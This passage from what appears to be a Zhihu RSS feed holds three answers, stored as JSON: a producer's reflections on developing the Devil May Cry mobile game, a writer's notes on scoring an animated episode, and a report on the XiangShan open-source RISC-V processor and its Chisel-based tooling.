data-hovercard=\"p$b$70c5673ee4e9644003f7a725c4a06a4e\">@知乎游戏</a>  的邀请</p>\n<blockquote>前言：大家好，我是《鬼泣-巅峰之战》（后续简称鬼泣手游）的制作人肥猫。项目自立项制作到现在已经过了3年时光，团队也从最初的100人扩展到现在的300多人，着实感慨颇多。近期也是终于开放了全平台公测，能够顺利将这部作品呈现给大家，我们内心是欣喜的。在此首先感谢各位对游戏始终如一的支持和喜爱，也感谢团队中所有人的辛苦付出，通过知乎这个平台，我也想和诸位聊一聊我对这款游戏的心里话。</blockquote>\n<p> 作为鬼泣手游的制作人，如何评价自己的游戏。我当然很想给他打100分，因为我了解这开发3年以来，游戏之中所包含的辛苦与努力。从无到有，优化调整，追进度改bug，就像呵护自己的孩子一般，从一次又一次的测试中见证它的成长。同时我也知道，它并不完美，但是我们希望通过自己的努力，让它变得更好，成为手机平台动作游戏中的佼佼者。最重要的，不负期待，不负鬼泣之名。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-bc043de6428384cffbecaf76a3140b6d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"798\" data-rawheight=\"448\" data-watermark=\"watermark\" data-original-src=\"v2-bc043de6428384cffbecaf76a3140b6d\" data-watermark-src=\"v2-64b5600f0def519dea7d167744c072c6\" data-private-watermark-src=\"v2-9ed5594669c7422f86778ea2b3b87d16\"></p>\n<p> 能成功获得少年时最爱游戏的ip授权，还是和CAPCOM这种动作游戏领衔的公司合作，真的能让人感到热血澎湃。同时我也问了自己一个问题，“把鬼泣做成手游，应该做成什么样子？”还记得第一次测试之时，那一版的鬼泣手游还不能飞起来。我们靠着一腔热血做出来的游戏，就动作游戏而言它是合格的，但是唯独不是鬼泣，不能空中连段算什么鬼泣？于是我们进行了推翻重做，才有了现在的“皇牌空战”。</p>\n<p>鬼泣手游还不够完美，作为一个游戏行业从业者而言，它需要打磨的点还有很多。公测以来，我们收到了许多玩家的留言反馈。有的沉着冷静，有的言辞激烈，即便是做好了面对这一切的心理准备，依旧感受到我们需要做的还很多。无论是什么样的留言，都是来自鬼泣手游和这个作品系列的热情，目的都是为了让游戏变得更好。所以在此想说一句“请轻喷”，当然建议我们都会评估，还请给我们一些时间，去解决那些让大家感受不佳的问题。</p>\n<p><br></p>\n<p>《鬼泣-巅峰之战》的诞生，我们到底做了哪些努力，借此机会也想和大家分享一下。</p>\n<p>鬼泣系列是一款主机游戏，要把这款大作搬到手机平台上，势必要根据实际情况进行取舍，还要面对许多突破式的挑战。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-adac55f6a8d4cdd4e67e7d8695ad423b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2250\" data-rawheight=\"1500\" data-watermark=\"watermark\" data-original-src=\"v2-adac55f6a8d4cdd4e67e7d8695ad423b\" data-watermark-src=\"v2-d1a6893670e81da0bd2facf76d4c6e99\" data-private-watermark-src=\"v2-f7d48bd0f6d52006342aa2565c718e37\"></p>\n<p> 对比同类型，鬼泣手游中一个角色的内容是非常的丰富，而且就技能而言，只要玩家获得了一类武器的某一个，那么武器所对应的所有技能就都可以去学习了，也可以通过各种武器的自由组合去实现更为华丽的操作，创造属于自己的连招，这一点是非常酷的。</p>\n<p>说实在话，单单就说还原《鬼泣》的战斗手感其实都是一个巨大的挑战，更不用说JC机制、踩怪弹反等特色战斗。市面上大部分手机动作游戏是没有跳跃的，而有极少数有跳跃的也没有《鬼泣》那样的踩怪JC机制。可以说在对标《鬼泣》原作操作的制作标准下，实际开发起来非常困难，涉及到很多的模块，我们需要不断的去优化调整。</p>\n<p>鬼泣手游并非是直接移植，我们在CAPCOM花了20年构筑的鬼泣大世界中进行填补，让手游的故事能够填补鬼泣世界观的空缺，也为粉丝们解答了许多设定上的未解之谜，比如“鬼泣3后维吉尔和但丁又发生了怎样的故事？”让我们的游戏真正成为鬼泣系列的新作。</p>\n<p>还有一点要说的是玩家体验方面，手游的推出让许多并不了解鬼泣系列的玩家到来，而游戏本身属于硬核向，所以在平衡新老用户的体验上做了很多功课。平衡新老用户主要是在保持机制的前提下做好数值的平衡，让老玩家能够玩的尽兴，同时新玩家也能体会到游戏的快乐。</p>\n<p>比如说我们注意到很多新用户在战斗时并不会按节奏和按键顺序来按，而是快速狂点一个按键，还有就是一直狂按输出，直到怪物抬手要攻击时又狂按闪避。我们按硬核动作游戏方式做的操作设计，反倒成了新的手游玩家体验不好的地方。所以我们在公测版本中修改了指令输入机制，还按照玩家的操作习惯把一些以前需要玩家自己学的技能放到初始技能里。这样新玩家在狂按一个键的时候也能按出实用的技能，在快要被揍的时候基本能及时闪开。</p>\n<p>未来，我们将陆续开放更多玩家之间有交互的玩法，更高画质的PC版也会上线。目前主线剧情、角色较少、游戏玩法较少、关卡难度偏低、新武器推出较慢等问题，我们一直都会关注，请相信我们会给各位一个满意的答案。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-c4ef4f204ed9371ea9eb4bafb782f6ca_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2208\" data-rawheight=\"1242\" data-watermark=\"watermark\" data-original-src=\"v2-c4ef4f204ed9371ea9eb4bafb782f6ca\" data-watermark-src=\"v2-7661d4834c34139c2649fa93f5b5e7f7\" data-private-watermark-src=\"v2-e6e94e96de396d3242c7d754645ab9bf\"></p>\n<p> 最后，再次感谢各位对于《鬼泣-巅峰之战》手游的支持，希望大家都能拥有一段热血沸腾的猎魔旅程。恶魔猎人，永不止步！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/fei-mao-35-76?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">肥猫</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/464092167/answer/1960966612?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">86 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/296672609?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如果出一款鬼泣手游，你对它有什么期待？</a><br><a href=\"http://www.zhihu.com/question/420899122?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怪物猎人和鬼泣这种游戏在哪个软件下载？</a><br>\n","link":"http://www.zhihu.com/question/464092167/answer/1960966612?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价《画江湖之不良人》第四季第 11 集？","date":"2021-06-24 11:30:09","description":"\n<p>大家好，我是舒，播又来。</p>\n<p>很抱歉上一更有些水，之前去外地忙事情，现在回来了！今天稍微多来点，不喜请绕。</p>\n<p>在本集中大阴谋线已经捋清，毒公与李嗣源意在天下，大决战就要来了。之前我说这是我最喜欢的一集，就来说说原因吧——</p>\n<p>因为本季篇幅较短，可用的时长十分有限，因此我只有大概两集的时间留给鲜参，不得不说有些难度，处理不好容易让观众不入戏。蚩离与鲜参的情感段落尤为短小，最终选择以《花腰带》这首苗语的定情歌作为引子，我觉得结果还是达到预期了。这集不像其他集数大多是矛盾比较激烈的，相对平缓的剧情想要好看费的力气就要更大。20多分钟，得将本季涉及到的大事件捋清楚，还要将父母爱情在观众心里坐实。篇幅的平衡确实有些麻烦。但我觉得本集节奏尚可，因此比起前面那些难度较小的集数，我更喜欢这一集。<i>（刚刚看到许多匿名提了些问题就不一一解答了，片子里没有讲到的，就是本季中不需要讲的）</i></p>\n<p>父母的那几个拉手我挺喜欢的，的确更容易get到他们的情感。这样的方式其实国外的片子用的蛮多，而且国外更会省事，许多不好处理的部分就以音乐剧的形式来呈现了。王子跟公主唱首歌，俩人关系就确定了……而且最神奇的是还能让观众很相信他们的关系，比费劲兮兮编写故事中的起承转合要容易太多了。</p>\n<p>但有一点，就是音乐得把住。</p>\n<p>若森干活雷厉风行，我们剧本的创作时间基本上就是一周一集，修改剧本的时间紧而又紧，因此我把收益较高的部分划给了剪辑、音乐和音效。本季中我这边对于音乐与音效的的把控确实是花了很大力气。但其实正常情况下本不应该在这个部分操心，完全交给负责人即可。但无奈时间巨tm紧，想要最短的时间配合镜头出效果，我只能完全参与进去。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d6021a4f316bf7d4978398d51b16ef9a_720w.jpg?rss\" data-caption=\"我觉得动效公司和毛亮老师绝对得“恨”死我。这只是第一遍反馈，每个都是一个小红点，连起来都快成红线了\" data-size=\"normal\" data-rawwidth=\"974\" data-rawheight=\"354\" data-watermark=\"watermark\" data-original-src=\"v2-d6021a4f316bf7d4978398d51b16ef9a\" data-watermark-src=\"v2-9cd16e54d9957a4a5748cae63056a155\" data-private-watermark-src=\"v2-ade2153ff0e811b334e3d4f3c151c144\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-f96267b3bd6c994f5001fa843403e552_720w.jpg?rss\" data-caption=\"某集的第二遍音效反馈\" data-size=\"normal\" data-rawwidth=\"2252\" data-rawheight=\"878\" data-watermark=\"watermark\" data-original-src=\"v2-f96267b3bd6c994f5001fa843403e552\" data-watermark-src=\"v2-f47871b670e05c95660a5daa147c1f42\" data-private-watermark-src=\"v2-0fb236f54a66ca0ee5d81a696f60e9c3\"></p>\n<p>先放一个我这边通过的花腰带（旋律demo）给大家听听。（知乎好像不能直接插入音频，附上网盘链接有兴趣的可以下载听一下）</p>\n<a data-draft-node=\"block\" data-draft-type=\"file-link-card\" href=\"https://pan.baidu.com/link/zhihu/7Vh2zduWhsimW5IEgmUjJ0QnatU38WbQUsl1==\" data-file-type=\"file\" data-file-source=\"baidu\" data-file-size=\"6072946\" data-file-extension=\"mp3\">花腰带最终DEMO-voc5-2.mp3</a><p>没通过的，但比较符合预期的，用在后续的剧情里有些不搭。</p>\n<a data-draft-node=\"block\" data-draft-type=\"file-link-card\" href=\"https://pan.baidu.com/link/zhihu/7Vh1zRuQhDiGaVd1d3SaFiVUdqOsRDRwdSJG==\" data-file-type=\"file\" data-file-source=\"baidu\" data-file-size=\"5368684\" data-file-extension=\"mp3\">花腰带废弃DEMO-voc-1.mp3</a><p><br></p>\n<p>剩下的demo太多了，就不一一给大家放了，我都没通过。光《花腰带》这个曲子就出了6、7个旋律不同的demo，其他配乐也差不多，在我这里反复了许多遍，毛老师辛苦了。。。如果还有下回，我一定不大半夜给你发语音了。</p>\n<p><br></p>\n<p>今就说到这儿吧，下周再唠。<i>（蚩离的模型是完颜政的事儿，就让它过去吧……没预算，不给做新模型了）</i></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/cheng-zi-duo-62?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">橙子多</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/465504311/answer/1958249074?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">79 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/467001152?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待《画江湖之不良人》第四季第11集？</a><br><a href=\"http://www.zhihu.com/question/463029565?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《画江湖之不良人》第四季感情线？</a><br>\n","link":"http://www.zhihu.com/question/465504311/answer/1958249074?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"首届 RISC-V 中国峰会 2021 年 6 月 21 日起在上海举行，有什么值得关注的地方？","date":"2021-06-23 04:15:08","description":"\n<p>22号下午关于香山的报告，因为Zoom直播出现了技术故障，导致大家未能听到完整的报告，稍有些遗憾。考虑了一下，这里就把报告PPT直接贴出来，再加上我们在香山开发过程中的一些考虑和想法，跟大家分享。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-8f4219b760442460fa7743602bb52bf6_720w.jpg?rss\" data-rawwidth=\"2035\" data-rawheight=\"1144\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8f4219b760442460fa7743602bb52bf6\" data-watermark-src=\"v2-0a4d567e9daf3c9851fcc39be43b39f1\" data-private-watermark-src=\"v2-37849addd056153ae64b11e462933d75\"></p>\n<p><b>这个报告主要回答四个问题：</b></p>\n<ul>\n<li>一、为什么要做香山？</li>\n<li>二、香山什么水平？</li>\n<li>三、香山怎么做的？</li>\n<li>四、香山未来如何发展？</li>\n</ul>\n<h2>一、为什么要做香山？</h2>\n<ol><li>2010年RISC-V诞生，迄今已有11年。如今，在RISC-V国际基金会网站上登记的各类商业或开源的RISC-V处理器核就有上百个（如下链接），<b>为什么还要做一个开源的高性能RISC-V核？</b>\n</li></ol>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//riscv.org/exchange/cores-socs/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">RISC-V Exchange: Cores &amp; SoCs - RISC-V International</a></p>\n<p>对于这个问题，我们和很多业界企业交流过，也做了很多调研与分析，这都让我们判断认为业界需要一个开源的高性能RISC-V核。另一方面，我们也在思考一个问题——<b>为什么CPU领域还没有一个像Linux那样的开源主线？1991年开源的Linux诞生，到今天正好30年</b>。如今，Linux不仅被工业界广泛应用，也成为学术界开展操作系统研究的创新平台。</p>\n<p>RISC-V是开放开源的指令集，<b>允许全世界任何人免费实现一个RISC-V处理器，可以是商用，也可以开源，这是和公司私有的X86/ARM指令集相比最大的区别之一</b>。但是，十年过去了，到现在还未能形成一个像Linux那样的开源主线。Berkeley的BOOM目标是一个高性能开源RISC-V核，但是BOOM代码仓库相对不开放，官方建议其他人实现任何功能都要事先和他们沟通，以确保不要与他们的计划产生冲突。根据GitHub官方的统计页面显示，<b>从2014年1月至今，为BOOM提交过超过100行代码修改的仅有8人</b>。由此可见，一定程度上因为BOOM严格的外部贡献政策，开源社区对BOOM的参与度并不高。</p>\n<p>所以，团队的唐丹博士和我一直认为要<b>建立一个像Linux那样的开源RISC-V核主线，既能被工业界广泛应用，又能支持学术界试验创新想法。最关键的是，一定要让它像Linux那样至少存活30年</b>！</p>\n<p>于是，“香山”诞生了。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3a7f495574800afebdaa377394034847_720w.jpg?rss\" data-rawwidth=\"2040\" data-rawheight=\"1154\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3a7f495574800afebdaa377394034847\" data-watermark-src=\"v2-c52687c3d5df75d5c99ab9f8f5a667b4\" data-private-watermark-src=\"v2-0efd422805882b36279d7d514ac92ca4\"></p>\n<p>2. <b>我们做了一年多的准备工作——申请经费，启动“一生一芯”计划培养人才，建立团队，寻找合作伙伴……这期间得到了太多太多人的支持和帮助：</b>计算所孙凝晖院士帮我们多处找经费，国科大全力支持“一生一芯”计划，鹏城实验室支持我们建立起后端物理设计团队，多位计算所老所友毅然决定参与开源主线等等，就不一一列举了。</p>\n<p>终于，香山正式启动了——<b>2020年6月11日，香山在GitHub上建立了代码仓库</b>。</p>\n<p>短短的的一年时间里，<b>25位同学和老师参与了香山的开发。821次主分支代码合并，3296次代码提交（commit），5万余行代码，400多个文档，记录了香山的成长过程</b>。我们的理念是<b>代码开源、流程开放、文档公开</b>。这期间，有企业直接参与开发，也有企业表达参与意向，都因为认同开源理念，愿意一起来共建开源的香山。这些来自工业界的积极反馈，给与我们极大的鼓舞和信心，<b>让我们更坚定地去践行“科研重工业模式”</b>。</p>\n<p>“科研重工业模式”，是 2020年1月我为《中国计算机学会通讯（CCCF）》写了一篇卷首语《<b>伯克利科研模式的启发</b>》中提出的：</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/268197755\" class=\"internal\">袁岚峰：CCCF卷首语 ：伯克利科研模式的启发 | 包云岗</a></p>\n<blockquote>回顾伯克利的科研历程，可以发现他们在过去几十年研制了大量的原型系统，不仅推动了技术进步甚至颠覆产业，也培养了一代代杰出人才（其中多位获得图灵奖）：1950年代CALDIC系统(Doug Englebart)，1960年代Project Genie系统(Butler Lampson与Chuck Thacker)，1970年代BSD Unix操作系统与INGRES数据库系统(Michael Stonebraker)，1980年代RISC处理器(David Patterson)，1990年代RAID存储系统与NOW机群系统……如果用一句话来<b>总结伯克利的科研模式</b>，那就是——<b>热衷于研制真正能改变现状的原型系统，哪怕需要大量工程投入</b>。国重主任孙凝晖院士称之为“<b>科研重工业模式</b>”。</blockquote>\n<p>“科研重工业模式”，我们不想纸上谈兵，我们要用行动去实践。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a511b0024ce4cb05c4d6b15754c04ea2_720w.jpg?rss\" data-rawwidth=\"2046\" data-rawheight=\"1152\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-a511b0024ce4cb05c4d6b15754c04ea2\" data-watermark-src=\"v2-bec93682f39b8aab1a1584b3512604e2\" data-private-watermark-src=\"v2-513820de9a80756d0cc49135a1a38905\"></p>\n<h2>二、香山什么水平？</h2>\n<p>3. 香山是一款开源RISC-V处理器核，<b>它的架构代号以湖命名</b>。<b>第一版架构代号是“雁栖湖”</b>，这是带有浓重国科大情节的同学们起的名字，因为他们研一都在怀柔雁栖湖待了一年。“雁栖湖”RTL代码于2021年4月完成，计划于7月基于28nm工艺流片，目前频率为1.3GHz。</p>\n<p><b>第二版架构代号是“南湖”</b>，这是向建党100周年致敬。“南湖”计划在今年年底流片，将采用14nm工艺，目标频率是2GHz。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-44ffc47f05bf3a3cf52251577b7fc838_720w.jpg?rss\" data-rawwidth=\"2047\" data-rawheight=\"1152\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-44ffc47f05bf3a3cf52251577b7fc838\" data-watermark-src=\"v2-8cd4e5dc1378177392484ea68e250018\" data-private-watermark-src=\"v2-f5e120cfb9f3b45a9121ffb9e8bf0a49\"></p>\n<p>香山选择什么开源许可证？这个问题纠结了我们好一阵子。后来，我们专门向北京大学周明辉教授请教，小伙伴们制定了4种开源许可证方案。<b>在反复对比权衡后，最终选择了如下表格中的方案①——木兰宽松版许可证（MulanPSLv2）</b>。在此，特别感谢北大周明辉老师的专业指导！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5fb476460aa3485b667fb3281acfb34e_720w.jpg?rss\" data-rawwidth=\"1147\" data-rawheight=\"633\" data-size=\"normal\" data-caption=\"开源许可证方案对比（徐易难整理）\" data-watermark=\"watermark\" data-original-src=\"v2-5fb476460aa3485b667fb3281acfb34e\" data-watermark-src=\"v2-a3cfb3d7966e2aaa0cb8c1fc6201222c\" data-private-watermark-src=\"v2-752c7b238a13ffd788c289c43e06eca2\"></p>\n<p>4. “雁栖湖”架构是一个<b>11级流水、6发射、4个访存部件的乱序处理器核</b>。在发射宽度上已经可以和一些ARM高端处理器核相当，但还未进行充分优化，因此实际性能还有不小的差距。我们希望未来通过持续迭代优化（“南湖”--&gt;\"X湖\"--&gt;\"Y湖\"--&gt;……），<b>性能达到ARM A76的水平</b>。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ed07d7468848b12c5a126ece025b7922_720w.jpg?rss\" data-rawwidth=\"2049\" data-rawheight=\"1145\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ed07d7468848b12c5a126ece025b7922\" data-watermark-src=\"v2-79dce8b78719a8b35fcd0ff2747a156a\" data-private-watermark-src=\"v2-dac56bc271f0fc46d4542ede366333dc\"></p>\n<p>5. 我们<b>基于GitHub CI构建了一套流程化的自动回归测试框架</b>，并在过去大半年不断增加测试负载，从cputest，risc-tests到Linux，到SPECCPU workload。这套自动回归测试框架在保障和验证芯片的正确性。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-978adaf22f9bc3b9084863d3b6a599dd_720w.jpg?rss\" data-rawwidth=\"2049\" data-rawheight=\"1157\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-978adaf22f9bc3b9084863d3b6a599dd\" data-watermark-src=\"v2-f3ab1bc6f814a5451bca1a14e6ebd1c8\" data-private-watermark-src=\"v2-927bb1e524c27c5b967a4e7d5bdad8c8\"></p>\n<p>每个大项目总会有一些激动人心的时刻，这段30秒的小视频记录了香山在FPGA上启动Linux/Debian的时刻，略带喜感。</p>\n<a href=\"https://www.zhihu.com/zvideo/1390842319982120960\">香山在FPGA上启动Linux/Debian</a><h2>三、香山怎么做的？</h2>\n<p>6. 香山开发初期速度非常快：<b>6月11日建立代码仓库，7月6日乱序流水线便已完成，能正确运行CoreMark，不到一个月时间；9月12日，Linux正确启动；10月22日，Debian正确启动</b>。</p>\n<p>接下来便是大半年的结构优化、性能调优、时序优化工作，<b>香山架构几乎相当于重构了一遍</b>。一个典型的例子，香山的第一版分支预测器（BPU）参考了BOOM的BPU，但后端评估频率只能达到800MHz（28nm）。于是负责BPU设计的勾凌睿在几位老师的指导下，不断优化BPU结构，最终将频率提升到了1.4GHz。</p>\n<p>这期间，小伙伴们纷纷自己动手，<b>开发了各种各样的优化和调试工具，大大地加速了优化和验证环节</b>。这让我真心佩服这批90后——他们真是<b>充满了创造力，从工作到生活，而主要驱动力之一就是“省（tou）时（lan）”</b>。比如宁可自己写个程序自动点外卖，也懒得打开手机看菜单点。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e798f0abbb38efa99a9765524da59021_720w.jpg?rss\" data-rawwidth=\"2045\" data-rawheight=\"1152\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-e798f0abbb38efa99a9765524da59021\" data-watermark-src=\"v2-ec59fc3a633b4fa91b01f4f9e44c21b7\" data-private-watermark-src=\"v2-3aa44b783e677eb869af89d98f034dbf\"></p>\n<p>7. 香山的开发至少有两个重要的决策，<b>第一个便是选择敏捷设计语言Chisel</b>。很多人质疑Chisel，排斥Chisel，但是我们在充分评估后，还是决定使用Chisel。</p>\n<p>我们团队是在2016年开始使用Chisel，一开始组里也充满质疑。2018年，我们设计了两组定量的对比实验，找了2位同学用Chisel、1位工程师用Verilog分别设计一个L2 Cache模块。通过一系列量化对比，得出了如下三个结论：</p>\n<ol>\n<li>\n<b>Chisel开发效率远高于Verilog</b>；</li>\n<li>\n<b>实现相同的功能，Chisel代码量仅为Verilog的1/5</b>（因此香山的5万行Chisel代码相当于25万行Verilog代码）；</li>\n<li>\n<b>Chisel的开发质量不比Verilog差</b>。</li>\n</ol>\n<p>后来将实验结果发表在2019年1月的《计算机研究与发展》。最近去华为交流，才知道这些<b>对比结果也推动了华为内部组建了Chisel开发团队，如今华为也是Chisel的支持者</b>。</p>\n<p>2020年，我们又<b>基于Chisel完成了一款8核标签化RISC-V处理器的流片</b>，这是基于Rocket处理器核进行了标签化体系结构改造，采用28nm工艺流片。虽然因为时间紧张，并没有进行细致的后端优化，但芯片返回后也还能正常运行在1.2GHz。这是一颗有一定复杂度的8核SoC芯片，但Chisel能应对。所以，<b>我们相信Chisel可用来开发复杂芯片</b>。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5f2ae6a85f722d5e3366013ec03ae753_720w.jpg?rss\" data-rawwidth=\"2045\" data-rawheight=\"1160\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-5f2ae6a85f722d5e3366013ec03ae753\" data-watermark-src=\"v2-d8a370507e3af42c53a7e4a804cd18a2\" data-private-watermark-src=\"v2-4c6fdf6695a2a5878414ec24eeba803d\"></p>\n<p>8. 在开发香山的过程中，<b>我们团队积累了丰富Chisel开发经验</b>。小伙伴们（徐易难、王凯帆、蔺嘉炜、余子濠、金越）准备了6个报告，将会在6月25日的CCC Workshop上和大家分享。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2d397ff60a8557b49d489440a17789a8_720w.jpg?rss\" data-rawwidth=\"2050\" data-rawheight=\"1159\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2d397ff60a8557b49d489440a17789a8\" data-watermark-src=\"v2-79ca8fb1ea50f57c6407ba9b1745893b\" data-private-watermark-src=\"v2-f4305cdafd1fe2b5363e779be6941bad\"></p>\n<p>9. 另一个重要决策就是<b>高度重视构建支持敏捷设计的流程与工具</b>。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d7ba7b1ee3c03c3d330c673c3c77e538_720w.jpg?rss\" data-rawwidth=\"2051\" data-rawheight=\"1153\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d7ba7b1ee3c03c3d330c673c3c77e538\" data-watermark-src=\"v2-2659375772c110108238f6ccea20dca5\" data-private-watermark-src=\"v2-aedb701aa403bfd1fb31d137faba01cc\"></p>\n<p>我们在开发香山的过程中，<b>一直在强调流程、平台、基础设施的重要性</b>。我更多是扮演了啦啦队队长的角色，而小伙伴们则真正将理念落实到了具体行动。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-02c89c0be6d728e2c0be8873b6894e36_720w.jpg?rss\" data-rawwidth=\"713\" data-rawheight=\"916\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-02c89c0be6d728e2c0be8873b6894e36\" data-watermark-src=\"v2-eefe816e98f6557494a91bde531e2cb1\" data-private-watermark-src=\"v2-df90cc6a088502c5fe272fc5e29d7c04\"></p>\n<p>10. 为了更好地支持Chisel开发与调试，为了更快地捕捉、复现和定位bug，为了更准确地评估优化技术的性能收益，<b>小伙伴们开发十余种各具特色的工具。这些工具支撑起了一套处理器芯片敏捷开发的流程</b>。当然，这套流程还比较初级，尚不系统化。我们也期待更多的开源开发者加入，一起完善这套敏捷设计流程。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b5f9d782da03cdab896d5ebda0b1fcb7_720w.jpg?rss\" data-rawwidth=\"2053\" data-rawheight=\"1154\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b5f9d782da03cdab896d5ebda0b1fcb7\" data-watermark-src=\"v2-e99302b14413b66ed10864e73158e8b5\" data-private-watermark-src=\"v2-e306425f8f508f4aef81074afe3d964b\"></p>\n<p>11. 下面举几个工具的例子。NEMU是由余子濠在南大本科时便开始开发的一款教学模拟器。在计算所读博期间，他凭借一人之力一直在持续改进和优化NEMU，使<b>NEMU成为一个效率接近QEMU的高性能解释器——启动Debian甚至比QEMU还要快18.2%</b>（9.87s vs. 12.07s）。</p>\n<p>更重要的是NEMU是指令解释器，<b>可以针对每一条指令进行动态分析</b>；相比而言，QEMU的翻译粒度是基本块，无法跟踪每一条指令。事实上，NEMU的这种指令解释器机制，成为了香山开发中正确性验证框架Difftest的基础。（余子濠将会在6月23日下午介绍NEMU）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b53034310c68487d9d3595083c02668a_720w.jpg?rss\" data-rawwidth=\"2054\" data-rawheight=\"1157\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b53034310c68487d9d3595083c02668a\" data-watermark-src=\"v2-493d0a0c9ddeca048251768c2068e534\" data-private-watermark-src=\"v2-5e4de996f012afc2d6f11eb2c2745ae0\"></p>\n<p>12. Cache是处理器中非常核心的模块，尤其是要支持一致性协议的Cache更为复杂。为此，小伙伴们<b>开发了一套专门验证支持TileLink一致性协议的Cache模块测试框架Agent Faker</b>，发现了好几个Cache模块的bug。（张传奇将会在6月25日上午介绍这个工作）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ca67a73de8769c982c718ec755c34e2d_720w.jpg?rss\" data-rawwidth=\"2050\" data-rawheight=\"1158\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ca67a73de8769c982c718ec755c34e2d\" data-watermark-src=\"v2-e4fddc41025bd2cb6ecef9cfbc5ed778\" data-private-watermark-src=\"v2-bc7eae5544e980b94efd2c645cdf4a88\"></p>\n<p>13. Difftest是一个基于NEMU的指令集在线差分验证框架。它的一端是模拟器，提供处理器执行的黄金标准；另一端是运行RTL的仿真器，在仿真过程中会将指令数、中断、MMIO、微结构状态等信息发送给NEMU进行比对，从而判断RTL实现的正确性。</p>\n<p>Difftest最早是由余子濠实现，后来王凯帆进行优化，<b>其中一个最重要的改进就是SMP-Difftest，支持多核SMP的全系统仿真，并且支持Cache一致性、内存一致性等需要软硬件协同的问题</b>。（王凯帆将会在6月24日下午介绍Difftest）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-cc6bf5873d1fd09c1ecc61f427494240_720w.jpg?rss\" data-rawwidth=\"2052\" data-rawheight=\"1161\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-cc6bf5873d1fd09c1ecc61f427494240\" data-watermark-src=\"v2-b465709f917a39b99b40add9318a440a\" data-private-watermark-src=\"v2-80f2b672aacd3b9f1daadf98cf0cee40\"></p>\n<p>14. 